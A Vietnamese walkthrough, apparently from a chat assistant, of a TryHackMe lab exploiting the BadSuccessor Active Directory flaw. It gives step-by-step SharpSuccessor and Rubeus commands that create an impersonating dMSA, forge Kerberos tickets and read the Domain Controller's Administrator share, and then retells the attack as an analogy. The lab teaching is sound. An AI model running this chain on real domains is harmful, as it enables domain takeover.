+Ừ, phần này là **quá trình khai thác thực tế** lỗi BadSuccessor. Tao sẽ giải thích từng bước cho mày.
+
+---
+
+### Tổng quan:
+- Mày sẽ **tạo một dMSA** trong OU mà mình có quyền, sau đó **giả mạo Administrator** để leo quyền Domain Admin.
+- Dùng 2 công cụ chính: **SharpSuccessor** (tạo dMSA) và **Rubeus** (thao tác với Kerberos tickets).
+
+---
+
+### Bước 1: Tạo dMSA với SharpSuccessor
+
+```powershell
+.\SharpSuccessor.exe add /path:"ou=LabOU,dc=tryhackme,dc=local" /account:tbyte /name:pentest_dmsa /impersonate:Administrator
+```
+
+**Giải thích từng tham số:**
+- `/path:"ou=LabOU,dc=tryhackme,dc=local"` – nơi mày có quyền tạo dMSA (LabOU).
+- `/account:tbyte` – tài khoản hiện tại (mày) có quyền tạo dMSA trong OU đó.
+- `/name:pentest_dmsa` – tên dMSA sẽ tạo.
+- `/impersonate:Administrator` – mục tiêu mày muốn mạo danh là tài khoản Administrator.
+
+Kết quả:
+```
+[+] Created dMSA object 'CN=pentest_dmsa' in 'ou=LabOU,dc=tryhackme,dc=local'
+[+] Successfully weaponized dMSA object
+```
+Nghĩa là dMSA đã được tạo và “vũ khí hóa” – sẵn sàng để mày giả mạo Admin.
+
+---
+
+### Bước 2: Lấy TGT của user hiện tại (tbyte)
+
+```powershell
+.\Rubeus.exe tgtdeleg /nowrap
+```
+
+- `tgtdeleg` lợi dụng một tính năng ít biết của Kerberos “unconstrained delegation” để lấy TGT của user hiện tại từ bộ nhớ.
+- `/nowrap` giúp xuất base64 trên 1 dòng cho dễ copy.
+
+Kết quả trả về một chuỗi base64 dài (ticket TGT). Mày cần nó cho bước sau.
+
+---
+
+### Bước 3: Xin TGS mạo danh Administrator bằng dMSA
+
+```powershell
+.\Rubeus.exe asktgs /targetuser:pentest_dmsa$ /service:krbtgt/tryhackme.local /opsec /dmsa /nowrap /ptt /ticket:doIFvjC...
+```
+
+**Giải thích:**
+- `/targetuser:pentest_dmsa$` – tài khoản dMSA mày tạo ra, giờ dùng để mạo danh.
+- `/service:krbtgt/tryhackme.local` – yêu cầu ticket cho dịch vụ KDC (krbtgt) – chính là TGS để đi tiếp.
+- `/opsec` – tránh gây ồn, không dùng RC4, kiểm tra an toàn.
+- `/dmsa` – chế độ cho biết đây là ticket dạng computer account.
+- `/ptt` – tự động nạp ticket vào phiên hiện tại (pass the ticket).
+- `/ticket:...` – truyền TGT lấy ở bước trước.
+
+Sau lệnh này, Rubeus sẽ trả về một ticket mới, mày copy lại.
+
+---
+
+### Bước 4: Lấy service ticket CIFS (truy cập file/SMB)
+
+```powershell
+.\Rubeus.exe asktgs /user:pentest_dmsa$ /service:cifs/DC-LAB2025-01.tryhackme.local /opsec /dmsa /nowrap /ptt /ticket:doIGLjCCB...
+```
+
+- `/user:pentest_dmsa$` – vẫn dùng dMSA.
+- `/service:cifs/DC-LAB2025-01.tryhackme.local` – yêu cầu ticket cho dịch vụ SMB/CIFS của Domain Controller.
+- Các tham số còn lại giống bước trên.
+
+Kết quả: ticket được import vào memory. Mày giờ có quyền truy cập SMB trên DC với tư cách Administrator.
+
+---
+
+### Bước 5: Truy cập Desktop của Administrator
+
+```powershell
+dir \\DC-LAB2025-01.tryhackme.local\c$\Users\Administrator\Desktop\
+```
+
+- Dùng ticket đã nạp, mày liệt kê thư mục Desktop của Admin trên DC qua SMB.
+- Thấy file `flag.txt` → thành công leo quyền.
+
+---
+
+### Tóm lại:
+- Tạo dMSA `pentest_dmsa`.
+- Lấy TGT của mình.
+- Dùng dMSA để xin TGS giả mạo Administrator.
+- Dùng TGS đó để xin ticket SMB.
+- Kết nối SMB đọc file flag.
+
+Đây là một chuỗi leo quyền rất thực tế trong môi trường AD. Hỏi tiếp nếu mày muốn đào sâu chỗ nào. 😎
+
+</div>
+
+---
+
+<div id="doc-7611ed97d57d785c30c90de43d239dde78631718" class="notion-callout-card">
+
+Ok mày, không sao. Tao sẽ giải thích cho mày theo kiểu **bình dân, dễ hiểu nhất**, không cần kiến thức AD trước. Cứ như anh em kể chuyện.
+
+### 🏨 Hình dung thế này:
+
+- **Active Directory (AD)** giống như **tòa nhà văn phòng lớn**. Trong đó có nhiều phòng, nhiều tài nguyên (file server, database...). Muốn vào từng phòng, mày phải có **thẻ ra vào**.
+- **Tài khoản người dùng** = nhân viên. **Tài khoản dịch vụ** = robot lau dọn, robot pha cà phê... (tự động chạy không cần người).
+- **Domain Admin** = ông chủ tòa nhà, vào được tất cả các phòng.
+
+### 🔑 Kerberos là gì?
+- Là **hệ thống phát thẻ** trong AD. Khi mày đăng nhập, Kerberos đưa cho mày một **tấm giấy thông hành (TGT)**.
+- Muốn vào một phòng cụ thể (dịch vụ file SMB), mày phải trình TGT để đổi lấy **vé vào phòng đó (TGS)**.
+- Mọi thứ đều là giấy tờ (ticket) nằm trong máy, không cần nhập mật khẩu lại.
+
+### 🧨 Lỗi BadSuccessor dễ hiểu thế này:
+1. Mày có quyền tạo một **robot dịch vụ đặc biệt** (gọi là dMSA).
+2. Do cấu hình lỏng lẻo, robot này có khả năng **giả dạng ông chủ tòa nhà** (Administrator).
+3. Mày tạo robot đó ra, xong dùng nó xin giấy thông hành giả có tên ông chủ.
+4. Cầm giấy thông hành đó vào phòng nào cũng được, kể cả phòng bí mật của ông chủ, và lấy cờ (flag).
+
+### 🛠️ Các bước tool đã làm (đừng sa đà vào lệnh):
+- **SharpSuccessor** = tạo con robot dMSA biết giả danh Administrator.
+- **Rubeus** = tay buôn giấy tờ giúp mày xin thẻ giả và đổi vé.
+- Cuối cùng, mày dùng vé giả để đọc file trên máy chủ.
+
+### Đọc lại đoạn trên với tâm thế đó:
+- `SharpSuccessor.exe add ... /impersonate:Administrator` → "tạo robot giả danh ông chủ".
+- `Rubeus tgtdeleg` → "lấy giấy thông hành của mày".
+- `Rubeus asktgs /targetuser:pentest_dmsa$ ...` → "nhờ robot xin vé giả mạo ông chủ".
+- `dir \\DC...\c$\Users\Administrator\Desktop` → "vào phòng ông chủ đọc file".
+
+Vậy là mày đã hiểu ý tưởng rồi. Chi tiết kỹ thuật AD thì mình bổ sung dần sau, giờ không cần cày sâu vội. Cứ nắm bức tranh lớn trước.
+
+Cần tao nói thêm chỗ nào không? 😎
+
+</div>
+
+---
+
